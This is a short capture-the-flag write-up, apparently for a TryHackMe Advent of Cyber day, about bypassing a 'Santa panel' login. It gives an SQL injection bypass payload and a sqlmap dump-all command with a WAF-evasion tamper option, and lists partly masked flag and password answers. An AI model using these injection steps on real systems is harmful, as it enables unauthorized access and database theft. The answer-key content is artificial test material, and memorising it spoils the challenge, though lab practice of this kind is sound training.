# Day 5 - Someone stole Santa's gift list!

- Without using directory brute forcing, what's Santa's secret login panel?

	- You don't have to use a directory fuzzer because you will not find a list with this word.
	- `santapanel`
	
- Visit Santa's secret login panel and bypass the login using SQLi

	no answer needed
	
	- Just enter in the username field `' OR true --`

- How many entries are there in the gift database?

	- `(' OR true --`
	- `22`

- What did Paul ask for?

	- `github ownership`

- What is the flag?

	- You have to enable the Burp option with FoxyProxy.
	- Then, open BurpSuie and perform a single request with the text field.
	- You will see BurpSuite opened with a http request. Send to repeater and save the item as shown in the explaining part previous the ctf.
	- Then start sqlmap with `sqlmap -r request.txt --tamper=space2comment --dump-all --dbms sqlite` taking request.txt as the saved file with BurpSuite.
	- (If sqlmap will ask you something, you have to try the largest attack you can, so try to perform all the tries you can; choosing y or n when it asks you).
	- `thmfox{***_*_****_***_*********_**_***}`

- What is the admin password?

	- `E***SW*z*******B`

# see you ...
